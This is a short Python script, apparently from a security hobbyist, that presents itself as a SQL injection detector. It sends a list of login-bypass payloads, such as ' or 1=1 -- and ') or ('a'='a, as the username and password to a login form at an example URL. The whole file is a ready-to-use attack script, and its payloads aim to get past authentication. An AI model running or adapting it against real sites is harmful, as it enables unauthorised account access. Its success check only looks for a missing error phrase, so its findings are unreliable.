print('CREATED BY ANESTUS UDUME FROM BENTECH SECURITY TO AUTO DETECT SQLI INJECTION')
import requests

url = "http://example.com/login.php"

payloads = ["' or 1=1 --", "' or '1'='1", "' or 1=1#", "' or '1'='1#", "') or ('a'='a"]

for payload in payloads:
    data = {"username": payload, "password": payload}
    response = requests.post(url, data=data)
    if "invalid credentials" not in response.text.lower():
        print("SQL injection vulnerability found with payload: " + payload)

